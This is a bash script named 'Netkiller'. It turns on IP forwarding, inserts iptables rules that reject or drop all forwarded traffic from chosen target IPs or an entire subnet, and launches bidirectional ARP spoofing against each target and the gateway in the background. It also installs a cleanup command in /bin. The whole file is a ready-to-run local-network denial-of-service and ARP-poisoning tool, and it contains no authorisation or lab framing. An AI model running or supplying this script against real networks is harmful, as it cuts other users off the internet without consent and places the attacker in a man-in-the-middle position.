#!/bin/bash

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    exec sudo "$0" "$@"
fi

# Detect network configuration
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
CIDR=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)

echo "Current Network Configuration"
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "Device IP: | $IP"
echo "TARGETS:   | $CIDR"
echo ""

# Detect interface 
echo "Enter Wireless Interface: Skip for default"
read -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"

# Detect Gateway IP
echo "Enter Router Gateway IP: Skip for default"
read -p "> $GW " INET
GATEWAY="${INET:-$GW}"

# Detect Target IPs or CIDR
echo "Enter Multiple Target IP (e.g 10.0.0.123,10.0.0.124) or CIDR (e.g., 192.168.1.0/24)"
read -p "> " SUB
NETWORK_CIDR="${SUB:-$CIDR}"

# Detect Device IP
MYIP="$IP"

echo ""
# Prompt configuration
echo "Target Network Configurations..."
echo "Target Interface: | $INTERFACE"
echo "Target Gateway:   | $GATEWAY"
echo "Target Subnet:    | $NETWORK_CIDR"
echo "This Device IP:   | $MYIP"
echo ""

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Cleanup function to remove iptables rules and kill arpspoof
cat > /bin/netkiller-stop << EOF
    echo "Cleaning up and restoring the connections..."
    iptables -F FORWARD 
    pkill -f arpspoof
EOF
chmod 755 /bin/netkiller-stop

# Function to validate IP address format
is_valid_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Check if input is a list of IPs or a CIDR
if [[ $NETWORK_CIDR =~ "," ]]; then
    # Handle multiple IPs
    IFS=',' read -ra TARGET_IPS <<< "$NETWORK_CIDR"
    for IP in "${TARGET_IPS[@]}"; do
        IP=$(echo "$IP" | tr -d '[:space:]') # Trim whitespace
        if is_valid_ip "$IP"; then
            # Skip if this is our own IP
            if [ "$IP" != "$MYIP" ]; then
                # Drop all packets except your IP source and destination (bidirectional)
                sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
                sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
                sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
                sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
                sudo iptables -I FORWARD -s "$IP" -j DROP

                # Bidirectional ARP spoofing
                (
                    arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
                    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
                ) &    
                echo "Netkiller kill the IP: $IP"
            else
                echo "Skipping our own IP: $IP"
            fi
        else
            echo "Invalid IP address: $IP. Skipping..."
        fi
    done
else
    # Handle CIDR range (original logic)
    HOSTMIN=$(ipcalc "$NETWORK_CIDR" | grep HostMin | awk '{print $2}')
    HOSTMAX=$(ipcalc "$NETWORK_CIDR" | grep HostMax | awk '{print $2}')

    # IP to decimal
    ip2dec() {
        IFS=. read -r a b c d <<< "$1"
        echo "$(( (a << 24) + (b << 16) + (c << 8) + d ))"
    }

    # Decimal to IP
    dec2ip() {
        local dec=$1
        echo "$(( (dec >> 24) & 255 )).$(( (dec >> 16) & 255 )).$(( (dec >> 8) & 255 )).$(( dec & 255 ))"
    }

    MIN=$(ip2dec "$HOSTMIN")
    MAX=$(ip2dec "$HOSTMAX")

    for (( i = MIN; i <= MAX; i++ )); do
        IP=$(dec2ip "$i")

        # Skip if this is our own IP
        if [ "$IP" != "$MYIP" ]; then
            # Drop all packets except your IP source and destination (bidirectional)
            sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
            sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
            sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
            sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
            sudo iptables -I FORWARD -s "$IP" -j DROP
            
            # Bidirectional ARP spoofing
            (
                sudo arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
                sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
            ) &
        else
            echo "Skipping our own IP: $IP"
        fi
    done
fi

echo "Netkiller killing the target IP: $NETWORK_CIDR"
echo ""
echo "Netkiller is running in the Background..."
echo "To stop, run: sudo netkiller-stop"
